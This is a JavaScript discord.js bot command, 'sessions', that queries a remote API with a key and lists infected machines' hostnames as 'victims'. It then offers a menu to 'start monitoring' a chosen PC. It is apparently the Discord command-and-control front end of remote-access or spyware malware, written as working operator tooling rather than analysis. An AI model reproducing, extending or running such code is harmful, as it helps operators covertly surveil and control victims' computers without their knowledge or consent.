const { MessageEmbed, MessageActionRow, MessageSelectMenu } = require("discord.js"); const axios = require('axios');
const config = require('../config.json')

function get_connections(key) {
    return new Promise((resolve, reject) => {
        response = axios.get(`${config.api_url}/connected?key=${key}`).then(response => { resolve(response.data) })
    })
}

exports.run = async (client, message, args) => {
    let key = args[1];
    if (!key) {
        let embed = new MessageEmbed().setColor(`#303037`).setDescription(`Please enter a key to get sessions`)
        return message.reply({ embeds: [embed] })
    }
    get_connections(key).then(response => {
        if (response.length == 0) {
            let embed = new MessageEmbed()
            .setAuthor(`Sessions \👀`)
            .setColor(`#303037`)
            .setDescription(`There are no victims in this key...`)
            return message.channel.send({ embeds: [embed]   })
        }
        let embed = new MessageEmbed()
        .setAuthor(`Sessions \👀`)
        .setColor(`#303037`)
        .setDescription(`Please Select A Item From The Menu To Monitor (\`Total Sessions : ${response['length']}\`)`)

        let options = [];

        response.hostnames.forEach(hostname => {
            options.push({
                label: hostname,
                description: 'Click me to start monitoring this pc.',
                value: `session:${hostname}:${key}`,
            })
        })
        const row = new MessageActionRow()

        .addComponents(
            new MessageSelectMenu()
                .setCustomId('session-select')
                .setPlaceholder('» Please Select A Session')
                .addOptions(options)
        );

        return message.channel.send({ embeds: [embed], components: [row]  })
    })
}

exports.conf = { enabled: true, guildOnly: false, aliases: ["ss","sss"], permLevel: 0 };

exports.help = { name: "sessions", description: "Get Sessions", usage: "sessions <key>" };